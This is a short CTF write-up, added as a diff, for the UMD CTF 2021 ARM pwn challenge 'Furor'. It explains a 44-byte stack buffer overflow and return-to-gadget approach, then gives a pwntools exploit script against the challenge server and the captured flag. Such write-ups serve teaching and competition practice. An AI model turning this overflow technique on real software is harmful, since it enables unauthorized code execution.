@@ -1,0 +1,48 @@
+<!--Solve date: 04/18/2021-->
+
+<h1>UMD CTF 2021 - Furor (Raspberry Pi)</h1>
+
+<h2>Pwn</h2>
+
+<h3>Writeup by YR81</h3>
+
+<h4>Discussion</h4>
+
+<h5>Program Behavior and ROP Exploit</h5>
+
+<p>This program features a buffer overflow vulnerability on an ARM CPU. For identifying standard functions, please see my <a href = "#umd2021_willow">Willow writeup</a> under reverse engineering. The program requests a password, then reads up to 100 characters into a buffer where the return address is located only <code>0x2c = 44</code> bytes above the buffer.</p>
+
+<img class = "small" src = "./images/umd2021_furor_1.png"/>
+
+<p>The flag is located in the memory space of the remote binary. Looking just above the <code>main</code> function, there is a neat little gadget that prints the secret flag:</p>
+
+<img class = "small" src = "./images/umd2021_furor_2.png"/>
+
+<p>The exploit is very simple - we only need to return to this gadget. The challenge was that in the remote binary, the address of this gadget is not the same as in the binary; in fact, according to this message on the final day of the CTF, it is 76 bytes above.</p>
+
+<img class = "small" src = "./images/umd2021_furor_3.png"/>
+
+<p>The reason for this is unclear to me, but the payload works, so no questions asked!</p>
+
+<h4>Payload</h4>
+
+<pre class = "python">
+
+from pwn import *
+
+target = 0x1034c + 76
+
+p = remote("chals4.umdctf.io", 7000)
+
+p.recvline()
+p.recvline()
+p.sendline(b'')
+p.recvuntil(b"Password: ")
+p.sendline(0x2c * b'\x01' + p32(target))
+
+p.interactive()
+</pre>
+
+<h4>Flag</h4>
+
+<p><code>UMDCTF-{ARM_L0V3s_R0P}</code></p>
